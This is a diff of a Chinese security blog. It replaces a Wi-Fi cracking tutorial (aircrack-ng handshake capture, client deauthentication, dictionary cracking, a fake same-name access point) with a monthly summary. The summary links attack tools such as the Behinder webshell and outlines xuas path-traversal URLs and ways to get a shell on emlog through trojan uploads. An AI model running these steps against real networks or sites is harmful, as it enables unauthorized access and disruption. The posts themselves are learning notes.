@@ -116,7 +116,7 @@
 
 
 
-  <meta name="keywords" content="无线安全,">
+  <meta name="keywords" content="总结,">
 
 
 
@@ -127,18 +127,18 @@
 
 
 
-<meta name="description" content="仅供学习参考 总结 wifi密码破解将WLAN0网卡开启混杂模式  airmon-ng start wlan0  ##提示要杀掉一些进程  airmon-ng check kill   airmon-ng start wlan0  1、查看附近Wi-Fi airodump-ng wlan0mon  2、进行握手包监听与获取 airodump-ng -c 通道值 —bssid wifi的mac值 -">
-<meta name="keywords" content="无线安全">
+<meta name="keywords" content="总结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Wi-Fi密码破解">
-<meta property="og:url" content="https://7iny.jxustctf.top/Wi-Fi攻击实战/index.html">
+<meta property="og:title" content="一九年四月总结">
+<meta property="og:url" content="https://7iny.jxustctf.top/一九年四月">
 <meta property="og:site_name" content="7iny">
-<meta property="og:description" content="仅供学习参考 总结 wifi密码破解将WLAN0网卡开启混杂模式  airmon-ng start wlan0  ##提示要杀掉一些进程  airmon-ng check kill   airmon-ng start wlan0  1、查看附近Wi-Fi airodump-ng wlan0mon  2、进行握手包监听与获取 airodump-ng -c 通道值 —bssid wifi的mac值 -">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-02-16T11:05:07.000Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1904.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/12.png">
+<meta property="og:updated_time" content="2019-08-04T03:30:37.168Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Wi-Fi密码破解">
-<meta name="twitter:description" content="仅供学习参考 总结 wifi密码破解将WLAN0网卡开启混杂模式  airmon-ng start wlan0  ##提示要杀掉一些进程  airmon-ng check kill   airmon-ng start wlan0  1、查看附近Wi-Fi airodump-ng wlan0mon  2、进行握手包监听与获取 airodump-ng -c 通道值 —bssid wifi的mac值 -">
+<meta name="twitter:title" content="一九年四月总结">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1904.jpg">
 
 
 
@@ -168,7 +168,7 @@
 
 
 
-  <link rel="canonical" href="https://7iny.jxustctf.top/Wi-Fi攻击实战/">
+  <link rel="canonical" href="https://7iny.jxustctf.top/一九年四月">
 
 
 
@@ -198,7 +198,7 @@ tpwidget("show");</script>
   </script>
 
 
-  <title>Wi-Fi密码破解 | 7iny</title>
+  <title>一九年四月总结 | 7iny</title>
   
 
 
@@ -264,7 +264,7 @@ tpwidget("show");</script>
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
+          <a href="/tags" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
@@ -274,7 +274,7 @@ tpwidget("show");</script>
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
+          <a href="/categories" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
             
@@ -284,7 +284,7 @@ tpwidget("show");</script>
       
         
         <li class="menu-item menu-item-studylink">
-          <a href="/studylink/" rel="section">
+          <a href="/studylink" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-battery"></i> <br>
             
@@ -294,7 +294,7 @@ tpwidget("show");</script>
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
+          <a href="/archives" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
@@ -367,7 +367,7 @@ tpwidget("show");</script>
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://7iny.jxustctf.top/Wi-Fi攻击实战/">
+    <link itemprop="mainEntityOfPage" href="https://7iny.jxustctf.top/一九年四月">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="7iny">
@@ -384,7 +384,7 @@ tpwidget("show");</script>
 
         
         
-          <h2 class="post-title" itemprop="name headline">Wi-Fi密码破解</h2>
+          <h2 class="post-title" itemprop="name headline">一九年四月总结</h2>
         
 
         <div class="post-meta">
@@ -396,8 +396,8 @@ tpwidget("show");</script>
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-30T18:54:00+08:00">
-                2019-01-30
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-26T23:37:00+08:00">
+                2019-04-26
               </time>
             
 
@@ -419,8 +419,8 @@ tpwidget("show");</script>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/无线学习/" itemprop="url" rel="index">
-                    <span itemprop="name">无线学习</span>
+                  <a href="/categories/总结/" itemprop="url" rel="index">
+                    <span itemprop="name">总结</span>
                   </a>
                 </span>
 
@@ -450,7 +450,7 @@ tpwidget("show");</script>
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  214
+                  724
                 </span>
               
 
@@ -466,7 +466,7 @@ tpwidget("show");</script>
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  2
                 </span>
               
             </div>
@@ -487,60 +487,49 @@ tpwidget("show");</script>
       
 
       
-        <p><strong>仅供学习参考</strong></p>
-<p><del>总结</del></p>
-<h1 id="wifi密码破解"><a href="#wifi密码破解" class="headerlink" title="wifi密码破解"></a>wifi密码破解</h1><p>将WLAN0网卡开启混杂模式</p>
+        <hr>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1904.jpg" alt=""></p>
+<a id="more"></a>
+<h1 id="一九年四月总结"><a href="#一九年四月总结" class="headerlink" title="一九年四月总结"></a>一九年四月总结</h1><h2 id="论坛："><a href="#论坛：" class="headerlink" title="论坛："></a>论坛：</h2><p>日本技术论坛:<a href="https://qiita.com/" target="_blank" rel="noopener">qiita</a>  </p>
+<p>Medium:是一个博客发布平台，由 Twitter 联合创办人埃文·威廉姆斯和比兹·斯通于2012年8月创办。该平台有专业和非专业的贡献者，亦有受雇的编者，是社会新闻报导的例子之一。<a href="https://medium.com/websec" target="_blank" rel="noopener">websec文章</a></p>
+<p>vulnspy:一个带有漏洞复现，漏洞博客的站点，<a href="https://www.vulnspy.com/" target="_blank" rel="noopener">点击访问</a></p>
+<p>chabug团队论坛：<a href="https://www.chabug.org/" target="_blank" rel="noopener">点击访问</a></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>外链转换网站:<a href="https://link.hhtjim.com/" target="_blank" rel="noopener">网站链接</a></p>
+<p>iTunes实现PC到ipad文件传输：<a href="https://zhidao.baidu.com/question/422281453.html" target="_blank" rel="noopener">百度知道</a></p>
+<p>音乐外链:<a href="http://mp34.butterfly.mopaasapp.com/" target="_blank" rel="noopener">热门歌曲下载</a></p>
+<p>漏洞查询网站:<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db</a></p>
+<p>过狗工具冰蝎:<a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener">下载地址</a></p>
+<p>电报安卓旧版:<a href="https://telegram.cn.uptodown.com/android/old" target="_blank" rel="noopener">下载地址</a></p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="讯时系统-xuas-后台漏洞"><a href="#讯时系统-xuas-后台漏洞" class="headerlink" title="讯时系统(xuas)后台漏洞"></a>讯时系统(xuas)后台漏洞</h3><p>回显后台：</p>
 <blockquote>
-<p>airmon-ng start wlan0</p>
+<p>/admin/admin_news_pl_view.asp?id=1</p>
 </blockquote>
-<p>##提示要杀掉一些进程</p>
+<p>列目录漏洞：</p>
 <blockquote>
-<p>airmon-ng check kill</p>
+<p><a href="http://www.xx.com/edit/admin_uploadfile.asp?id=46&amp;dir=../." target="_blank" rel="noopener">http://www.xx.com/edit/admin_uploadfile.asp?id=46&amp;dir=../.</a>.</p>
 </blockquote>
-<blockquote>
-<p>airmon-ng start wlan0</p>
-</blockquote>
-<h2 id="1、查看附近Wi-Fi"><a href="#1、查看附近Wi-Fi" class="headerlink" title="1、查看附近Wi-Fi"></a>1、查看附近Wi-Fi</h2><blockquote>
-<p>airodump-ng wlan0mon</p>
-</blockquote>
-<h2 id="2、进行握手包监听与获取"><a href="#2、进行握手包监听与获取" class="headerlink" title="2、进行握手包监听与获取"></a>2、进行握手包监听与获取</h2><blockquote>
-<p>airodump-ng -c 通道值 —bssid wifi的mac值 -w cap文件名 wlan0mon</p>
-</blockquote>
-<p>##其中wlan0mon是启动混杂模式的网卡名</p>
-<h2 id="3、断网抓取握手包（另开一个窗口）"><a href="#3、断网抓取握手包（另开一个窗口）" class="headerlink" title="3、断网抓取握手包（另开一个窗口）"></a>3、断网抓取握手包（另开一个窗口）</h2><blockquote>
-<p>aireplay-ng -0 20 -c 客户机mac值 -a wifi热点mac值 wlan0mon</p>
-</blockquote>
-<p>#-0 death模式 20为发送次数</p>
-<h2 id="4、跑包"><a href="#4、跑包" class="headerlink" title="4、跑包"></a>4、跑包</h2><blockquote>
-<p>aircrack-ng -w 字典 包名</p>
-</blockquote>
-<ul>
-<li>关闭混杂模式</li>
-</ul>
-<blockquote>
-<p>airmon-ng stop wlan0mon</p>
-</blockquote>
-<ul>
-<li>启动网络</li>
-</ul>
-<blockquote>
-<p>service network-manager start</p>
-</blockquote>
-<p>——————————分割线———————————</p>
-<h1 id="构造同名的虚假AP"><a href="#构造同名的虚假AP" class="headerlink" title="构造同名的虚假AP"></a>构造同名的虚假AP</h1><blockquote>
-<p>airbase-ng —essid wifi名 -c 6 -Z 4 wlan0mon</p>
-</blockquote>
-<ul>
-<li><p>-c 代表channel信道</p>
-</li>
-<li><p>-Z代表WPA2加密</p>
-</li>
-<li><p>-z代表WPA1加密</p>
-</li>
-</ul>
-<blockquote>
-<p>z后面的参数1～5分别表示WEP40、TKIP、WRAP、CCMP、WEP104</p>
-</blockquote>
+<p>漏洞参考文章</p>
+<p><a href="https://www.nuoweb.com/hack/398.html" target="_blank" rel="noopener">讯时系统(xuas)最新通杀漏洞0day图文说明</a></p>
+<p><a href="https://www.jb51.net/hack/44598.html" target="_blank" rel="noopener">讯时后台管理系统v4.9的鸡肋漏洞分析</a></p>
+<h3 id="emblog拿shell思路"><a href="#emblog拿shell思路" class="headerlink" title="emblog拿shell思路"></a>emblog拿shell思路</h3><p>1.后台爆破试试弱口令</p>
+<p>2.上传模板拿shell，模板文件夹中放入木马，路径为content/templates/模板名/木马名</p>
+<p>3.上传插件拿shell，插件文件夹中放入木马，路径为content/plugins/模板名/木马名</p>
+<p>4.设置那里有个“允许上传的附件类型 ”，加入asp文件类型（emlog限制了添加php的后缀，没把asp的给限制）<code>未验证是否可行</code></p>
+<p>漏洞参考文章</p>
+<p><a href="http://www.hacksec.cn/Penetration-test/22.html" target="_blank" rel="noopener">emlog后台拿shell方法合集</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html" target="_blank" rel="noopener">emlog后台作者权限SQL注入</a></p>
+<p><a href="https://www.jianshu.com/p/01864139dfc7" target="_blank" rel="noopener">针对emlog友情链接插件审计出的SQL注入漏洞</a></p>
+<p><a href="https://www.cesafe.com/6518.html" target="_blank" rel="noopener">emlog全版本后台GetShell 视频教程</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>1.<a href="https://www.chabug.org/web/580.html" target="_blank" rel="noopener">冰蝎动态二进制加密过waf并修改自己菜刀过狗</a></p>
+<p>2.<a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">冰蝎项目readme</a></p>
+<h2 id="伪造电子邮件以及制造电子邮件炸弹的攻防探讨"><a href="#伪造电子邮件以及制造电子邮件炸弹的攻防探讨" class="headerlink" title="伪造电子邮件以及制造电子邮件炸弹的攻防探讨"></a>伪造电子邮件以及制造电子邮件炸弹的攻防探讨</h2><p><a href="https://www.freebuf.com/sectool/184555.html" target="_blank" rel="noopener">freebuf文章</a>,<a href="https://www.tr0y.wang/2018/09/26/email-hacker/" target="_blank" rel="noopener">作者的个人博客</a></p>
+<h2 id="github学习项目"><a href="#github学习项目" class="headerlink" title="github学习项目"></a>github学习项目</h2><p>1.<a href="https://lib-pku.github.io/" target="_blank" rel="noopener">“北大图书馆”Github传送门</a></p>
+<p>2.<a href="https://github.com/QSCTech" target="_blank" rel="noopener">浙大项目传送门</a><br>3.<a href="https://github.com/PKUanonym" target="_blank" rel="noopener">清华大学共享了计算机系课程资源</a><br>4.<a href="https://github.com/mbinary" target="_blank" rel="noopener">中科大共享了计算机学院的课程资源</a></p>
+<p>5.<a href="https://github.com/CoolPhilChen" target="_blank" rel="noopener">上海交大共享了14门关于计算机和高数的课程资源</a></p>
+<h2 id="给四月的一些碎碎念"><a href="#给四月的一些碎碎念" class="headerlink" title="给四月的一些碎碎念"></a>给四月的一些碎碎念</h2><p>四月，慢慢地自己进入了考研复习的状态，但是并没有全身心的投入，以至于瞎搞了这些四月的技术方面的骚操作。博客在四月后到考研结束，骚操作将不会更新。可能会更新一些算法吧，一来是为了复习数据结构，二来是提升一下编程能力。万一复习得不错选了一个有机试的学校呢？</p>
+<p>希望自己不要辜负大学最后一段青春，愿自己如愿以偿。</p>
+<p><code>放下所有无关的东西，好好学习天天向上。</code></p>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/12.png" alt="Give time,Let the past pass"></p>
 
       
     </div>
@@ -568,7 +557,7 @@ tpwidget("show");</script>
       
         <div class="post-tags">
           
-            <a href="/tags/无线安全/" rel="tag"><i class="fa fa-tag"></i> 无线安全</a>
+            <a href="/tags/总结/" rel="tag"><i class="fa fa-tag"></i> 总结</a>
           
         </div>
       
@@ -581,14 +570,18 @@ tpwidget("show");</script>
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/一九年三月" rel="next" title="一九年三月总结">
+                <i class="fa fa-chevron-left"></i> 一九年三月总结
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/hexo-admin插件/" rel="prev" title="hexo-admin插件">
-                hexo-admin插件 <i class="fa fa-chevron-right"></i>
+              <a href="/一九年五月" rel="prev" title="一九年五月总结">
+                一九年五月总结 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -668,7 +661,7 @@ tpwidget("show");</script>
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives">
               
                   <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">日志</span>
@@ -757,7 +750,7 @@ tpwidget("show");</script>
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#wifi密码破解"><span class="nav-number">1.</span> <span class="nav-text">wifi密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、查看附近Wi-Fi"><span class="nav-number">1.1.</span> <span class="nav-text">1、查看附近Wi-Fi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、进行握手包监听与获取"><span class="nav-number">1.2.</span> <span class="nav-text">2、进行握手包监听与获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、断网抓取握手包（另开一个窗口）"><span class="nav-number">1.3.</span> <span class="nav-text">3、断网抓取握手包（另开一个窗口）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、跑包"><span class="nav-number">1.4.</span> <span class="nav-text">4、跑包</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#构造同名的虚假AP"><span class="nav-number">2.</span> <span class="nav-text">构造同名的虚假AP</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一九年四月总结"><span class="nav-number">1.</span> <span class="nav-text">一九年四月总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#论坛："><span class="nav-number">1.1.</span> <span class="nav-text">论坛：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具"><span class="nav-number">1.2.</span> <span class="nav-text">工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#讯时系统-xuas-后台漏洞"><span class="nav-number">1.3.1.</span> <span class="nav-text">讯时系统(xuas)后台漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#emblog拿shell思路"><span class="nav-number">1.3.2.</span> <span class="nav-text">emblog拿shell思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">1.4.</span> <span class="nav-text">参考文章</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#冰蝎"><span class="nav-number">1.4.1.</span> <span class="nav-text">冰蝎</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#伪造电子邮件以及制造电子邮件炸弹的攻防探讨"><span class="nav-number">1.5.</span> <span class="nav-text">伪造电子邮件以及制造电子邮件炸弹的攻防探讨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github学习项目"><span class="nav-number">1.6.</span> <span class="nav-text">github学习项目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#给四月的一些碎碎念"><span class="nav-number">1.7.</span> <span class="nav-text">给四月的一些碎碎念</span></a></li></ol></li></ol></div>
             
 
           </div>
